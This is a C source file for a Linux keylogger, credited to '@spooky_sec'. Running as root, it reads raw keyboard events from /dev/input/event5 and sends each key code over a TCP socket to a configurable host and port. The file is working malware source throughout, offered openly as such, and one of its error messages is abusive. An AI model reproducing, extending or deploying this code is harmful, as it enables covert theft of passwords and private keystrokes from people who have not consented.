/*
 * =====================================================================================
 *
 *       Filename:  main.c
 *
 *    Description:  A linux keylogger connected to socket 
 *
 *        Version:  1.0 
 *        Created:  19:45:17 2020
 *       Compiler:  gcc
 *
 *         Author:  @spooky_sec 
 *
 * =====================================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <string.h>
#include <strings.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <netdb.h>

#define HOST "127.0.0.1"
#define PORT 1337
#define MAX  1024
#define SA   struct sockaddr
#define DEBUG

int sendKey(int sockfd, int key) {
    if ( send(sockfd, &key, sizeof key, 0) < 0 ) {
        return 1;
    } else {
        return 0;
    }
}
int main(int argc, char **argv) {
    
    if ( (getuid() != 0) ) {
        printf("[!] Please run as root!\n");
        return 1;
    }

    struct input_event event;
    int sockfd;
    int sendbytes;
    struct sockaddr_in servaddr;

    int fd = open("/dev/input/event5", O_RDONLY);
    

    if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
        perror("[!] Socket");
        return 1;
    }

    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port   = htons(PORT);

    if ( inet_pton(AF_INET, HOST, &servaddr.sin_addr) <= 0 ) {
        perror("[!] Inet_Pton");
        return 1;
    }

    printf("[+] Attempting to connect to %s on port %d\n", HOST, PORT);
    if ( connect(sockfd, (SA *) &servaddr, sizeof(servaddr)) < 0 ) {
        perror("[!] Connect");
        return 1;
    }
    printf("[*] Successfully connected!\n");

    while (1) {
        read(fd, &event, sizeof event);
        fflush(stdout);
        if ( (event.type == EV_KEY) && (event.value == 0) ) {
            sendbytes = event.code;
            if ( sendKey(sockfd, sendbytes) != 1 ) {
                printf("[*] Key successfully sent!\n");
            } else {
                printf("[!] go kill yourself\n");
                return 1;
            }
        }
    }
}
